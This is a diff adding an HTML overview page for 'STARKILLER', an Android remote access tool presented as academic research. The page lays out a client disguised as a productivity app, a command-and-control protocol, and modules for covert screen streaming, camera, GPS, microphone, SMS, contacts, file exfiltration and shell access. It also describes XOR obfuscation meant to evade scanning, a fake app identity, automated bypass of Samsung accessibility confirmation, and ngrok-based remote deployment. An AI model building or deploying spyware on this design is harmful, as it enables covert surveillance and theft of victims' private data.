@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>STARKILLER — Technical Overview</title>
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --bg2: #0f0f1a;
+    --bg3: #13131f;
+    --border: #1e1e2e;
+    --accent: #bd93f9;
+    --green: #50fa7b;
+    --red: #ff5555;
+    --yellow: #f1fa8c;
+    --cyan: #8be9fd;
+    --orange: #ffb86c;
+    --pink: #ff79c6;
+    --text: #f8f8f2;
+    --muted: #6272a4;
+    --code-bg: #1a1a2e;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.6; }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  .banner {
+    background: linear-gradient(180deg, #0d0d1f 0%, #0a0a0f 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 40px 20px 30px;
+    text-align: center;
+  }
+  .banner pre {
+    color: var(--accent);
+    font-size: 11px;
+    display: inline-block;
+    text-align: left;
+    line-height: 1.3;
+  }
+  .banner .tagline { color: var(--muted); margin-top: 16px; font-size: 13px; letter-spacing: 2px; text-transform: uppercase; }
+
+  .status-bar {
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 40px;
+    display: flex;
+    gap: 32px;
+    flex-wrap: wrap;
+  }
+  .status-item { display: flex; align-items: center; gap: 8px; font-size: 12px; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; }
+  .dot-green { background: var(--green); box-shadow: 0 0 6px var(--green); }
+  .dot-yellow { background: var(--yellow); }
+  .dot-red { background: var(--red); }
+  .dot-cyan { background: var(--cyan); }
+
+  .container { max-width: 1100px; margin: 0 auto; padding: 40px 20px; }
+
+  h1 { color: var(--cyan); font-size: 20px; letter-spacing: 1px; margin-bottom: 8px; border-left: 3px solid var(--cyan); padding-left: 12px; }
+  h2 { color: var(--accent); font-size: 16px; margin: 32px 0 12px; letter-spacing: 1px; }
+  h3 { color: var(--orange); font-size: 14px; margin: 20px 0 8px; }
+  p { color: var(--text); margin-bottom: 12px; opacity: 0.85; }
+
+  .section { margin-bottom: 48px; }
+
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+  @media(max-width:700px) { .grid2, .grid3 { grid-template-columns: 1fr; } }
+
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+  }
+  .card-title { color: var(--pink); font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+  .card-body { color: var(--muted); font-size: 12px; line-height: 1.7; }
+  .card-body strong { color: var(--text); }
+
+  code {
+    background: var(--code-bg);
+    color: var(--green);
+    padding: 1px 6px;
+    border-radius: 3px;
+    font-size: 12px;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    overflow-x: auto;
+    font-size: 12px;
+    line-height: 1.7;
+    margin: 12px 0;
+  }
+  pre .c { color: var(--muted); }
+  pre .k { color: var(--pink); }
+  pre .f { color: var(--cyan); }
+  pre .s { color: var(--yellow); }
+  pre .n { color: var(--orange); }
+  pre .v { color: var(--accent); }
+  pre .ok { color: var(--green); }
+
+  table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  th { background: var(--bg3); color: var(--accent); padding: 10px 14px; text-align: left; font-size: 11px; letter-spacing: 1px; text-transform: uppercase; border-bottom: 1px solid var(--border); }
+  td { padding: 8px 14px; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: top; }
+  tr:hover td { background: var(--bg2); }
+  .tag { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; }
+  .tag-green { background: #1a3a1a; color: var(--green); border: 1px solid #2a5a2a; }
+  .tag-yellow { background: #3a3a1a; color: var(--yellow); border: 1px solid #5a5a2a; }
+  .tag-red { background: #3a1a1a; color: var(--red); border: 1px solid #5a2a2a; }
+  .tag-cyan { background: #1a2a3a; color: var(--cyan); border: 1px solid #2a4a5a; }
+  .tag-purple { background: #2a1a3a; color: var(--accent); border: 1px solid #4a2a6a; }
+
+  .flow {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin: 12px 0;
+    font-size: 12px;
+  }
+  .flow-box {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 6px 12px;
+    border-radius: 4px;
+  }
+  .flow-arrow { color: var(--muted); }
+
+  .test-result { display: flex; gap: 12px; align-items: center; margin: 6px 0; font-size: 12px; }
+  .pass { color: var(--green); }
+  .fail { color: var(--red); }
+  .warn { color: var(--yellow); }
+
+  footer { border-top: 1px solid var(--border); padding: 24px 40px; text-align: center; color: var(--muted); font-size: 11px; letter-spacing: 1px; }
+</style>
+</head>
+<body>
+
+<div class="banner">
+<pre>
+ ███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
+ ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
+ ███████╗   ██║   ███████║██████╔╝█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
+ ╚════██║   ██║   ██╔══██║██╔══██╗██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
+ ███████║   ██║   ██║  ██║██║  ██║██║  ██╗██║███████╗███████╗███████╗██║  ██║
+ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+</pre>
+<div class="tagline">Android Remote Access Tool — 22DIV // VADER // CSEC Academic Research</div>
+</div>
+
+<div class="status-bar">
+  <div class="status-item"><div class="dot dot-green"></div><span>Phase 4 COMPLETE — commit 0a84f8c</span></div>
+  <div class="status-item"><div class="dot dot-cyan"></div><span>13/13 Auto-Test PASS</span></div>
+  <div class="status-item"><div class="dot dot-cyan"></div><span>VNC 5/5 frames</span></div>
+  <div class="status-item"><div class="dot dot-yellow"></div><span>Samsung One UI 4 // SM-G970U</span></div>
+  <div class="status-item"><div class="dot dot-green"></div><span>Play Protect: CLEAN</span></div>
+  <div class="status-item"><div class="dot dot-red"></div><span>Own hardware only. Authorised research.</span></div>
+</div>
+
+<div class="container">
+
+  <!-- SECTION: WHAT THIS IS -->
+  <div class="section">
+    <h1>Overview</h1>
+    <p>Android RAT built from first principles. Kotlin client disguised as a productivity app ("DayBoard"), Python C2 server with desktop GUI and Discord relay. Communicates over VADER protocol — 4-byte big-endian length-prefixed JSON over raw TCP. Zero third-party C2 frameworks.</p>
+    <p>Built for CSEC academic research, own devices only. Validated against Samsung Galaxy S10e (SM-G970U) running One UI 4 / Android 12. Fully automated test suite from locked-phone state.</p>
+  </div>
+
+  <!-- SECTION: ARCHITECTURE -->
+  <div class="section">
+    <h2>Architecture</h2>
+
+    <div class="flow">
+      <div class="flow-box" style="border-color:#bd93f9;color:#bd93f9">Python C2<br><small style="color:#6272a4">starkiller_gui.py</small></div>
+      <span class="flow-arrow">←TCP→</span>
+      <div class="flow-box" style="border-color:#50fa7b;color:#50fa7b">Android Agent<br><small style="color:#6272a4">SyncService.kt</small></div>
+      <span class="flow-arrow">⟶</span>
+      <div class="flow-box" style="border-color:#8be9fd;color:#8be9fd">Dispatcher.kt<br><small style="color:#6272a4">task router</small></div>
+      <span class="flow-arrow">⟶</span>
+      <div class="flow-box" style="border-color:#ffb86c;color:#ffb86c">Modules<br><small style="color:#6272a4">DisplayHelper / PhotoHelper / etc</small></div>
+    </div>
+
+    <div class="flow">
+      <div class="flow-box">build.py</div>
+      <span class="flow-arrow">⟶</span>
+      <div class="flow-box">Config.kt inject</div>
+      <span class="flow-arrow">⟶</span>
+      <div class="flow-box">Gradle build</div>
+      <span class="flow-arrow">⟶</span>
+      <div class="flow-box">obfuscate.py</div>
+      <span class="flow-arrow">⟶</span>
+      <div class="flow-box" style="color:#50fa7b">DayBoard.apk</div>
+    </div>
+
+    <h3>VADER Protocol</h3>
+    <pre><span class="c">// Every message: 4-byte big-endian length prefix + UTF-8 JSON body</span>
+<span class="c">// Agent → C2 on connect:</span>
+{ <span class="s">"type"</span>: <span class="s">"register"</span>, <span class="s">"hostname"</span>: <span class="s">"SM-G970U"</span>, <span class="s">"model"</span>: <span class="s">"samsung SM-G970U"</span>, <span class="s">"battery"</span>: 100 }
+
+<span class="c">// C2 → Agent task dispatch:</span>
+{ <span class="s">"type"</span>: <span class="s">"task"</span>, <span class="s">"task_id"</span>: <span class="s">"a3f9b1"</span>, <span class="s">"op"</span>: <span class="s">"vnc"</span>, <span class="s">"frames"</span>: 5, <span class="s">"interval"</span>: 500 }
+
+<span class="c">// Agent → C2 result:</span>
+{ <span class="s">"type"</span>: <span class="s">"result"</span>, <span class="s">"task_id"</span>: <span class="s">"a3f9b1"</span>, <span class="s">"data"</span>: { <span class="s">"frame"</span>: 0, <span class="s">"data"</span>: <span class="s">"&lt;base64 JPEG&gt;"</span> } }
+
+<span class="c">// Agent → C2 heartbeat (every 30s):</span>
+{ <span class="s">"type"</span>: <span class="s">"heartbeat"</span>, <span class="s">"battery"</span>: 98, <span class="s">"timestamp"</span>: 1750000000000 }</pre>
+  </div>
+
+  <!-- SECTION: MODULE TABLE -->
+  <div class="section">
+    <h2>Capability Matrix</h2>
+    <table>
+      <tr><th>Module</th><th>File</th><th>Op</th><th>Status</th><th>Notes</th></tr>
+      <tr>
+        <td><strong>VNC Stream</strong></td>
+        <td><code>DisplayHelper.kt</code></td>
+        <td><code>vnc</code></td>
+        <td><span class="tag tag-green">LIVE 5/5</span></td>
+        <td>MediaProjection. Samsung VD lazy-update fixed via lastFrame cache. acc→MP fallback.</td>
+      </tr>
+      <tr>
+        <td><strong>Screenshot</strong></td>
+        <td><code>DisplayHelper.kt</code></td>
+        <td><code>screenshot</code></td>
+        <td><span class="tag tag-yellow">MP GRANT REQ</span></td>
+        <td>Samsung strips CAPABILITY_CAN_TAKE_SCREENSHOT. Falls back to MediaProjection.</td>
+      </tr>
+      <tr>
+        <td><strong>Camera</strong></td>
+        <td><code>PhotoHelper.kt</code></td>
+        <td><code>camera</code></td>
+        <td><span class="tag tag-green">LIVE</span></td>
+        <td>front/back. Camera2 API. JPEG 60% quality. Runtime permission via ADB.</td>
+      </tr>
+      <tr>
+        <td><strong>GPS</strong></td>
+        <td><code>LocProvider.kt</code></td>
+        <td><code>gps</code></td>
+        <td><span class="tag tag-green">LIVE</span></td>
+        <td>Last known → live request on main Looper. 15s timeout.</td>
+      </tr>
+      <tr>
+        <td><strong>Microphone</strong></td>
+        <td><code>AudioHelper.kt</code></td>
+        <td><code>record</code></td>
+        <td><span class="tag tag-cyan">IMPL</span></td>
+        <td>MediaRecorder to 3GP. Duration param. Not yet in auto-test.</td>
+      </tr>
+      <tr>
+        <td><strong>SMS</strong></td>
+        <td><code>MsgReader.kt</code></td>
+        <td><code>messages</code></td>
+        <td><span class="tag tag-cyan">IMPL</span></td>
+        <td>ContentResolver dump + send. READ_SMS + SEND_SMS.</td>
+      </tr>
+      <tr>
+        <td><strong>Contacts</strong></td>
+        <td><code>AddrBook.kt</code></td>
+        <td><code>contacts</code></td>
+        <td><span class="tag tag-cyan">IMPL</span></td>
+        <td>Full contact dump: name, phone, email.</td>
+      </tr>
+      <tr>
+        <td><strong>Files</strong></td>
+        <td><code>StorageHelper.kt</code></td>
+        <td><code>ls</code> / <code>file_download</code></td>
+        <td><span class="tag tag-cyan">IMPL</span></td>
+        <td>Directory listing + raw file exfil over VADER.</td>
+      </tr>
+      <tr>
+        <td><strong>Shell</strong></td>
+        <td><code>Dispatcher.kt</code></td>
+        <td><code>sh</code></td>
+        <td><span class="tag tag-cyan">IMPL</span></td>
+        <td>Runtime.exec() → stdout/stderr/exit. Android shell context.</td>
+      </tr>
+      <tr>
+        <td><strong>Installed Apps</strong></td>
+        <td><code>PkgScanner.kt</code></td>
+        <td><code>apps</code></td>
+        <td><span class="tag tag-cyan">IMPL</span></td>
+        <td>PackageManager dump: name, package, version, signature.</td>
+      </tr>
+      <tr>
+        <td><strong>Browser History</strong></td>
+        <td><code>HistoryReader.kt</code></td>
+        <td><code>history</code></td>
+        <td><span class="tag tag-cyan">IMPL</span></td>
+        <td>Chrome history ContentProvider. READ_HISTORY_BOOKMARKS permission.</td>
+      </tr>
+      <tr>
+        <td><strong>Sysinfo</strong></td>
+        <td><code>SysInfo.kt</code></td>
+        <td><code>sysinfo</code></td>
+        <td><span class="tag tag-green">LIVE</span></td>
+        <td>Device model, OS, IMEI, IP, battery, WiFi SSID.</td>
+      </tr>
+      <tr>
+        <td><strong>Accessibility</strong></td>
+        <td><code>AccessService.kt</code></td>
+        <td>internal</td>
+        <td><span class="tag tag-yellow">PARTIAL</span></td>
+        <td>Bound on Samsung after UI confirm. takeScreenshot blocked by OEM policy.</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- SECTION: CLIENT ARCHITECTURE -->
+  <div class="section">
+    <h2>Android Client — File Map</h2>
+    <div class="grid2">
+
+      <div class="card">
+        <div class="card-title">Config.kt</div>
+        <div class="card-body">Runtime-injected constants. <strong>C2_HOST</strong>, <strong>C2_PORT</strong>, <strong>APP_NAME</strong> written by <code>build.py</code> before Gradle compiles. Never committed with real values.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Crypt.kt</div>
+        <div class="card-body">XOR obfuscation for string literals. KEY=0x5A, XOR with (KEY + i%7) rotation. All op-code strings in Dispatcher.kt are encoded — <code>k("...")</code> decodes at runtime. Prevents static string scanning.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">SyncService.kt</div>
+        <div class="card-body">Foreground service. Owns the TCP connection, wake lock, battery optimisation exemption. Foreground type: DATA_SYNC | MEDIA_PROJECTION — required for Android 12 MediaProjection API call. ACTION_ACTIVATE_MP intent handler for projection setup.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">SyncAdapter.kt</div>
+        <div class="card-body">TCP socket I/O. Implements VADER framing: 4-byte big-endian length + JSON body. <code>sendResult()</code>, <code>sendHeartbeat()</code>, <code>sendFileData()</code>. Handles disconnection, reconnect backoff (base 2s, max 60s).</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Dispatcher.kt</div>
+        <div class="card-body">Receives task JSON, routes by <code>op</code> to module methods. Thread pool (4 threads). All op-code strings are XOR-encoded. Catch-all sends error JSON. Lazy module initialisation.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">GrantActivity.kt</div>
+        <div class="card-body">Single-use MediaProjection consent activity. <code>FLAG_ACTIVITY_NEW_TASK</code> + <code>FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS</code>. On RESULT_OK: sends ACTION_ACTIVATE_MP intent to SyncService — projection setup runs inside foreground service, survives Activity.finish().</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">AccessService.kt</div>
+        <div class="card-body">AccessibilityService backend. Samsung One UI 4 strips CAPABILITY_CAN_TAKE_SCREENSHOT — RuntimeException caught, returns null, falls back to MediaProjection. <code>instance</code> volatile ref for isAvailable() checks.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">CoverActivity.kt</div>
+        <div class="card-body">User-visible UI. "DayBoard" productivity cover. Launches SyncService. Handles first-run permissions: CAMERA, AUDIO, LOCATION, STORAGE. Battery optimisation exemption. Accessibility shortcut settings navigation.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">DisplayHelper.kt</div>
+        <div class="card-body">VNC + screenshot engine. MediaProjection → VirtualDisplay → ImageReader pipeline. Samsung VD lazy-update fix: <code>lastFrame</code> cache, poll(2s) with fallback. VNC stream sends N frames as intermediate results then stream_done. acc→MP fallback when captureFrame() returns null.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">PhotoHelper.kt</div>
+        <div class="card-body">Camera2 API. CameraManager → CameraDevice → ImageReader. Front/back selection by LENS_FACING. Single shot: ImageReader.acquireLatestImage() → JPEG ByteArray. Cleans up CameraDevice on completion.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">LocProvider.kt</div>
+        <div class="card-body">GPS + network location. Last known first (fast path). Falls back to requestSingleUpdate with Looper.getMainLooper() — required when called from thread pool. 15s CountDownLatch wait.</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">SysInfo.kt</div>
+        <div class="card-body">Device fingerprint: model, manufacturer, Android version, IMEI (READ_PHONE_STATE), WiFi SSID (ACCESS_WIFI_STATE), IP address, battery level via BatteryManager.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SECTION: BUILD PIPELINE -->
+  <div class="section">
+    <h2>Build Pipeline</h2>
+    <pre><span class="c"># 1. Inject C2 address into Config.kt</span>
+<span class="f">python</span> build.py <span class="n">--ip</span> &lt;C2_IP&gt; <span class="n">--port</span> &lt;PORT&gt; <span class="n">--name</span> &lt;APP_NAME&gt;
+
+<span class="c"># 2. build.py does:</span>
+<span class="c">#    a) Write Config.kt with C2_HOST / C2_PORT / APP_NAME constants</span>
+<span class="c">#    b) Update app/build.gradle.kts applicationId for namespace isolation</span>
+<span class="c">#    c) Run: gradlew.bat assembleDebug</span>
+<span class="c">#    d) Copy APK to payloads/starkiller-debug.apk</span>
+
+<span class="c"># 3. Install + run (ADB)</span>
+adb install -r payloads/starkiller-debug.apk
+adb shell am start -n com.georgetech.filesync/.CoverActivity
+
+<span class="c"># 4. Production: WAN deploy via ngrok</span>
+ngrok tcp 8667           <span class="c"># get 0.tcp.au.ngrok.io:PORT</span>
+<span class="f">python</span> build.py <span class="n">--ip</span> 0.tcp.au.ngrok.io <span class="n">--port</span> &lt;PORT&gt; <span class="n">--name</span> DayBoard</pre>
+  </div>
+
+  <!-- SECTION: SAMSUNG OPSEC NOTES -->
+  <div class="section">
+    <h2>Samsung One UI 4 — Platform Notes</h2>
+    <table>
+      <tr><th>Issue</th><th>Root Cause</th><th>Fix Applied</th></tr>
+      <tr>
+        <td>ADB a11y grant ignored</td>
+        <td>SemExclusiveTaskManagerService blocks third-party service binding without UI confirm</td>
+        <td>uiautomator UI automation: Accessibility → Installed apps → Screen Assist → Allow</td>
+      </tr>
+      <tr>
+        <td>takeScreenshot throws</td>
+        <td>Samsung strips CAPABILITY_CAN_TAKE_SCREENSHOT from third-party services</td>
+        <td>try-catch in captureFrame(), returns null, falls to MediaProjection</td>
+      </tr>
+      <tr>
+        <td>VirtualDisplay lazy frames</td>
+        <td>VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR only pushes on screen content change</td>
+        <td>lastFrame cache: poll(2s) ?: lastFrame in stream() and capture()</td>
+      </tr>
+      <tr>
+        <td>projection=null after setup</td>
+        <td>setupCapture() calls teardown() which nulls projection, never re-sets it</td>
+        <td>Added <code>projection = proj</code> inside setupCapture() after virtDisplay assignment</td>
+      </tr>
+      <tr>
+        <td>MediaProjection dies after GrantActivity.finish()</td>
+        <td>Projection lifecycle bound to Activity, not Service</td>
+        <td>ACTION_ACTIVATE_MP intent — getMediaProjection() runs inside SyncService foreground executor</td>
+      </tr>
+      <tr>
+        <td>GPS crash on thread pool</td>
+        <td>requestSingleUpdate(null Looper) on thread without Looper.prepare()</td>
+        <td>Pass Looper.getMainLooper() explicitly</td>
+      </tr>
+      <tr>
+        <td>Screen lock breaks test</td>
+        <td>Camera disabled, MediaProjection blocked, Settings nav fails when locked</td>
+        <td>adb shell input keyevent KEYCODE_WAKEUP + wm dismiss-keyguard at test start</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- SECTION: AUTO TEST RESULTS -->
+  <div class="section">
+    <h2>Automated Test Results — commit 0a84f8c</h2>
+    <p>Fully automated from USB-connected locked phone. No manual interaction required (Samsung accessibility confirm is automated via uiautomator).</p>
+    <div class="grid2">
+      <div>
+        <div class="test-result"><span class="pass">✓ PASS</span> ADB device connected</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> APK built + installed</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> Runtime permissions (ADB pm grant)</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> AccessibilityService enabled (ADB + UI confirm)</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> Mini C2 + ADB reverse tunnel</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> Agent connected (register message)</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> Capability check (acc_status)</div>
+      </div>
+      <div>
+        <div class="test-result"><span class="pass">✓ PASS</span> AccessibilityService BOUND (UI confirm)</div>
+        <div class="test-result"><span class="warn">~ PASS</span> Screenshot (ADB fallback, MP grant pending)</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> Camera front (14KB JPEG)</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> VNC stream — 5/5 frames (MediaProjection)</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> GPS (-33.906, 151.022)</div>
+        <div class="test-result"><span class="pass">✓ PASS</span> Play Protect scan — CLEAN</div>
+        <div class="test-result" style="margin-top:8px;border-top:1px solid #1e1e2e;padding-top:8px"><span class="pass">13 / 13</span> PASS &nbsp; <span class="fail">0</span> FAIL</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION: OBFUSCATION LAYER -->
+  <div class="section">
+    <h2>Obfuscation Layer</h2>
+    <div class="grid3">
+      <div class="card">
+        <div class="card-title">XOR String Encoding</div>
+        <div class="card-body">All op-codes and sensitive string literals in Dispatcher.kt encoded with <code>Crypt.e()</code>. Decoded at runtime via <code>k()</code> → <code>Crypt.d()</code>. Prevents static string grep for <code>"camera"</code>, <code>"gps"</code>, etc.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Cover Identity</div>
+        <div class="card-body"><strong>App name:</strong> DayBoard (productivity widget). <strong>Service label:</strong> Screen Assist. <strong>Notification:</strong> "Syncing". <strong>Package:</strong> com.georgetech.filesync. Appears as a sync/productivity app.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Build-time Injection</div>
+        <div class="card-body">C2 IP/port baked in at compile time via Config.kt. No hardcoded server strings in APK defaults — placeholder values only. build.py overwrites before Gradle runs.</div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<footer>
+  STARKILLER — 22DIV // VADER // george wu &nbsp;|&nbsp; CSEC Academic Research &nbsp;|&nbsp; Own hardware only &nbsp;|&nbsp; commit 0a84f8c &nbsp;|&nbsp; 2026-06-25
+</footer>
+
+</body>
+</html>
